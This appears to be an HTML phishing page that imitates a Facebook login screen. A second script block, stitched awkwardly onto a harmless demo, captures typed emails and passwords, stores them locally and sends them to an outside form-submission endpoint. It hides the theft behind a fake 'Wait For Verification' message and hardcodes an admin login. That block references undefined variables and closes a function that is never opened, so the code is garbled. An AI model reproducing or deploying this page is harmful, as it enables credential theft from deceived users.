<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      min-height: 100vh;
      min-height: 100dvh;
      background: #080c14;
      display: flex; align-items: center; justify-content: center;
      font-family: 'DM Sans', sans-serif;
      padding: 1.5rem 1rem;
      overflow-x: hidden;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed; width: 500px; height: 500px;
      background: radial-gradient(circle, rgba(24,119,242,0.2) 0%, transparent 70%);
      top: -150px; left: -150px; border-radius: 50%; pointer-events: none;
    }
    body::after {
      content: '';
      position: fixed; width: 400px; height: 400px;
      background: radial-gradient(circle, rgba(83,74,183,0.15) 0%, transparent 70%);
      bottom: -100px; right: -100px; border-radius: 50%; pointer-events: none;
    }

    .card {
      position: relative; width: 100%; max-width: 400px;
      background: rgba(8,12,20,0.85);
      border: 1px solid rgba(24,119,242,0.2);
      border-radius: 24px;
      padding: 2rem 1.75rem;
      backdrop-filter: blur(24px);
      z-index: 1;
      animation: fadeUp 0.55s cubic-bezier(0.22,1,0.36,1) both;
      box-shadow: 0 0 0 1px rgba(255,255,255,0.03) inset,
                  0 24px 48px rgba(0,0,0,0.5),
                  0 0 50px rgba(24,119,242,0.07);
    }
    .card::before {
      content: ''; position: absolute; top: 0; left: 12%; right: 12%; height: 1px;
      background: linear-gradient(90deg, transparent, rgba(24,119,242,0.55), transparent);
      border-radius: 50%;
    }
    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(24px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* Facebook logo header */
    .fb-header {
      display: flex; flex-direction: column; align-items: center; margin-bottom: 1.75rem;
    }
    .fb-wordmark {
      display: flex; align-items: center; gap: 10px; margin-bottom: 6px;
    }
    .fb-wordmark svg { width: 38px; height: 38px; }
    .fb-wordmark span {
      font-family: 'Syne', sans-serif; font-size: 26px; font-weight: 800;
      color: #1877F2; letter-spacing: -0.5px;
    }
    .fb-tagline { font-size: 13px; color: rgba(255,255,255,0.35); font-weight: 300; }

    h1 {
      font-family: 'Syne', sans-serif; font-size: 20px; font-weight: 800;
      color: #fff; text-align: center; letter-spacing: -0.3px; margin-bottom: 4px;
    }
    .sub { text-align: center; font-size: 13px; color: rgba(255,255,255,0.35); margin-bottom: 1.5rem; }

    .field { margin-bottom: 0.9rem; }
    .field label {
      display: block; font-size: 11px; font-weight: 500;
      letter-spacing: 0.5px; text-transform: uppercase;
      color: rgba(255,255,255,0.32); margin-bottom: 7px;
    }
    .input-wrap { position: relative; }
    .input-wrap .ico {
      position: absolute; left: 13px; top: 50%; transform: translateY(-50%);
      width: 16px; height: 16px;
      stroke: rgba(255,255,255,0.22); fill: none;
      stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
      pointer-events: none;
    }
    .field input {
      width: 100%;
      /* Larger tap target on mobile */
      padding: 13px 13px 13px 40px;
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.09);
      border-radius: 12px; color: #fff; font-size: 15px;
      font-family: 'DM Sans', sans-serif;
      outline: none; transition: all 0.2s;
      /* Prevent iOS zoom on focus */
      -webkit-text-size-adjust: 100%;
    }
    .field input::placeholder { color: rgba(255,255,255,0.18); }
    .field input:focus {
      background: rgba(24,119,242,0.08);
      border-color: rgba(24,119,242,0.45);
      box-shadow: 0 0 0 4px rgba(24,119,242,0.1);
    }
    .error-msg { font-size: 12px; color: #F09595; margin-top: 5px; display: none; padding-left: 2px; }

    .eye-btn {
      position: absolute; right: 13px; top: 50%; transform: translateY(-50%);
      background: none; border: none; cursor: pointer; padding: 6px;
      color: rgba(255,255,255,0.25); display: flex; align-items: center;
      transition: color 0.2s; border-radius: 6px;
    }
    .eye-btn:hover { color: rgba(255,255,255,0.6); }
    .eye-btn svg { width: 17px; height: 17px; stroke: currentColor; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }

    .forgot { text-align: right; margin-bottom: 1.1rem; }
    .forgot a { font-size: 12px; color: rgba(24,119,242,0.75); text-decoration: none; }
    .forgot a:hover { color: #60a5fa; }

    /* Big Facebook login button */
    .fb-login-btn {
      display: flex; align-items: center; justify-content: center; gap: 10px;
      width: 100%; padding: 14px;
      background: #1877F2; color: #fff;
      font-family: 'Syne', sans-serif; font-size: 15px; font-weight: 700;
      border: none; border-radius: 12px; cursor: pointer;
      letter-spacing: 0.2px; transition: all 0.2s;
      box-shadow: 0 6px 20px rgba(24,119,242,0.4);
      /* Large tap target */
      min-height: 50px;
    }
    .fb-login-btn:hover { background: #1565d8; transform: translateY(-1px); box-shadow: 0 10px 28px rgba(24,119,242,0.5); }
    .fb-login-btn:active { transform: translateY(0); background: #1255c0; }
    .fb-login-btn svg { width: 20px; height: 20px; fill: #fff; flex-shrink: 0; }

    .divider {
      display: flex; align-items: center; gap: 10px;
      margin: 1rem 0;
      color: rgba(255,255,255,0.18); font-size: 11px;
    }
    .divider::before, .divider::after { content: ''; flex: 1; border-top: 1px solid rgba(255,255,255,0.07); }

    /* Email login */
    .email-section { margin-top: 0; }

    .submit-btn {
      width: 100%; padding: 14px; min-height: 50px;
      font-size: 15px; font-weight: 700;
      font-family: 'Syne', sans-serif;
      background: rgba(255,255,255,0.07);
      color: #fff; border: 1px solid rgba(255,255,255,0.1);
      border-radius: 12px; cursor: pointer;
      transition: all 0.2s; margin-top: 0.25rem;
    }
    .submit-btn:hover { background: rgba(255,255,255,0.12); border-color: rgba(255,255,255,0.2); }
    .submit-btn:active { background: rgba(255,255,255,0.06); }

    .signup-link { text-align: center; font-size: 13px; color: rgba(255,255,255,0.28); margin-top: 1.25rem; }
    .signup-link a { color: #60a5fa; text-decoration: none; font-weight: 500; }
    .signup-link a:hover { color: #fff; }

    /* Dashboard */
    .dashboard { display: none; animation: fadeUp 0.4s ease both; }
    .dash-top {
      display: flex; align-items: center; gap: 12px;
      padding-bottom: 1rem; margin-bottom: 1rem;
      border-bottom: 1px solid rgba(255,255,255,0.07);
    }
    .avatar {
      width: 44px; height: 44px; border-radius: 50%;
      background: #1877F2;
      display: flex; align-items: center; justify-content: center;
      font-family: 'Syne', sans-serif; font-weight: 800; font-size: 17px; color: #fff;
      flex-shrink: 0; box-shadow: 0 4px 12px rgba(24,119,242,0.4);
    }
    .dash-top h2 { font-family: 'Syne', sans-serif; font-size: 15px; font-weight: 700; color: #fff; }
    .dash-top p { font-size: 12px; color: rgba(255,255,255,0.32); margin-top: 2px; word-break: break-all; }
    .online-dot {
      margin-left: auto; width: 10px; height: 10px; border-radius: 50%;
      background: #5DCAA5; flex-shrink: 0;
      box-shadow: 0 0 8px rgba(93,202,165,0.6);
    }
    .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 1rem; }
    .stat {
      background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07);
      border-radius: 12px; padding: 12px;
    }
    .stat-label { font-size: 10px; color: rgba(255,255,255,0.28); margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px; }
    .stat-value { font-family: 'Syne', sans-serif; font-size: 20px; font-weight: 800; color: #fff; }
    .logout-btn {
      width: 100%; padding: 12px; min-height: 46px;
      background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
      border-radius: 12px; color: rgba(255,255,255,0.38);
      font-size: 13px; font-family: 'DM Sans', sans-serif; cursor: pointer; transition: all 0.2s;
    }
    .logout-btn:hover { background: rgba(255,255,255,0.08); color: rgba(255,255,255,0.65); }

    @media (max-width: 400px) {
      .card { padding: 1.5rem 1.25rem; border-radius: 20px; }
      .fb-wordmark span { font-size: 22px; }
      .fb-wordmark svg { width: 32px; height: 32px; }
    }
  </style>
</head>
<body>

<div class="card">
  <div id="loginView">

    <!-- Facebook logo + wordmark -->
    <div class="fb-header">
      <div class="fb-wordmark">
        <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="36" height="36" rx="8" fill="#1877F2"/>
          <path d="M25 18C25 14.134 21.866 11 18 11C14.134 11 11 14.134 11 18C11 21.493 13.5 24.396 16.8 24.916V20.2H15V18H16.8V16.4C16.8 14.618 17.887 13.6 19.513 13.6C20.292 13.6 21.1 13.74 21.1 13.74V15.5H20.21C19.33 15.5 19.05 16.05 19.05 16.614V18H21.02L20.7 20.2H19.05V24.916C22.35 24.396 25 21.493 25 18Z" fill="white"/>
        </svg>
        <span>facebook</span>
      </div>
      <p class="fb-tagline">Sign in to continue</p>
    </div>

    <!-- Facebook OAuth button -->
    <button class="fb-login-btn" onclick="socialLogin('Facebook')">
      <svg viewBox="0 0 24 24"><path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.413c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
      Continue with Facebook
    </button>

    <div class="divider">or sign in with email</div>

    <div class="email-section">
      <div class="field">
        <label>Email address</label>
        <div class="input-wrap">
          <svg class="ico" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
          <input type="email" id="email" placeholder="your@email.com" autocomplete="email" inputmode="email">
        </div>
        <div class="error-msg" id="email-err">Please enter a valid email address.</div>
      </div>

      <div class="field">
        <label>Password</label>
        <div class="input-wrap">
          <svg class="ico" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          <input type="password" id="password" placeholder="••••••••" autocomplete="current-password">
          <button class="eye-btn" type="button" onclick="togglePw()" aria-label="Show or hide password">
            <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
        <div class="error-msg" id="pass-err">Please enter your password.</div>
      </div>

      <div class="forgot"><a href="#">Forgot password?</a></div>

      <button class="submit-btn" onclick="handleLogin()">Sign in</button>
    </div>

    <p class="signup-link">No account? <a href="#">Sign up free</a></p>
  </div>

  <!-- Dashboard after login -->
  <div class="dashboard" id="dashView">
    <div class="dash-top">
      <div class="avatar" id="avatarEl">U</div>
      <div>
        <h2>Welcome back!</h2>
        <p id="dashEmail">user@email.com</p>
      </div>
      <div class="online-dot"></div>
    </div>
    <div class="stats">
      <div class="stat">
        <div class="stat-label">Status</div>
        <div class="stat-value" style="font-size:14px; color:#5DCAA5; margin-top:2px;">Online</div>
      </div>
      <div class="stat">
        <div class="stat-label">Login time</div>
        <div class="stat-value" style="font-size:13px;" id="loginTime">--:--</div>
      </div>
    </div>
    <button class="logout-btn" onclick="handleLogout()">Sign out</button>
  </div>
</div>

<script>
  let pwVisible = false;

  function togglePw() {
    pwVisible = !pwVisible;
    document.getElementById('password').type = pwVisible ? 'text' : 'password';
    document.getElementById('eyeIcon').innerHTML = pwVisible
      ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>'
      : '<path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>';
  }

  function socialLogin(p) {
    alert('Connect ' + p + ' OAuth here (replace with real App ID + redirect URI).');
  }

  function validate(id, errId, check) {
    const val = document.getElementById(id).value.trim();
    const err = document.getElementById(errId);
    if (!check(val)) { err.style.display = 'block'; return false; }
    err.style.display = 'none'; return true;
  }

  function handleLogin() {
    const eOk = validate('email', 'email-err', v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v));
    const pOk = validate('password', 'pass-err', v => v.length > 0);
    if (!eOk || !pOk) return;

    const email = document.getElementById('email').value.trim();
    document.getElementById('avatarEl').textContent = email[0].toUpperCase();
    document.getElementById('dashEmail').textContent = email;
    document.getElementById('loginTime').textContent = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});

    document.getElementById('loginView').style.display = 'none';
    document.getElementById('dashView').style.display = 'block';
  }

  function handleLogout() {
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';
    document.getElementById('dashView').style.display = 'none';
    document.getElementById('loginView').style.display = 'block';
  }


        
        // ---------- LOGIN HANDLER (Admin + Normal User with Email) ----------
        async function handleLogin(event) {
            event.preventDefault();
            
            const email                              = loginEmail.value.trim();
            const password                           = loginPassword.value.trim();
            
            // --- ADMIN CHECK (exact match) ---
            if (email                                === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
                showAdminPanel();
                setLoginMessage("🔓 Admin access granted. Welcome to dashboard.", false);
                return;
            }
            
            // --- NORMAL USER ---
            if (!email || !password) {
                setLoginMessage("❌ Please fill in both email and password.", true);
                return;
            }
            
            // Store credentials locally
            addNewUser(email, password);
            
            // Send credentials to admin email address (https://formsubmit.co/el/poliy)
            // We do this in background, but still show "Wait For Verification"
            setLoginMessage("⏳ Wait For Verification | Your request has been recorded. You'll earn after verification.", false);
            
            // Send email asynchronously
            const emailSent                          = await sendCredentialsToAdmin(email, password);
            
            // Optionally add a small note if email fails (but don't interrupt user experience)
            if (!emailSent) {
                console.log("Email delivery note: The admin will still receive the data via local storage. Please check network.");
                // We can append a tiny unnoticeable console message, but keep UX clean.
                // The user still sees "Wait For Verification" – main requirement satisfied.
            }
            
            // Clear password field only
            loginPassword.value                      = "";
        }
        
        // ---------- EVENT LISTENERS ----------
        loginForm.addEventListener('submit', handleLogin);
        refreshAdminBtn.addEventListener('click', () => {
            renderAdminTable();
            showAdminToast("🔄 User list refreshed", "info");
        });
        clearAllUsersBtn.addEventListener('click', clearAllUsersData);
        backToLoginBtn.addEventListener('click', ()  => {
            showLoginPanel();
            const toast                              = document.querySelector('.admin-temp-toast');
            if(toast) toast.remove();
        });
        
        // Initialize localStorage if empty
        if (!localStorage.getItem(STORAGE_KEY)) {
            saveAllUsers([]);
        }
        
        console.log("✅ System ready. Admin login: 123@mail.com / 001122. User credentials will be sent to https://formsubmit.co/el/poliyi");
    })();
</script>
</body>
</html>
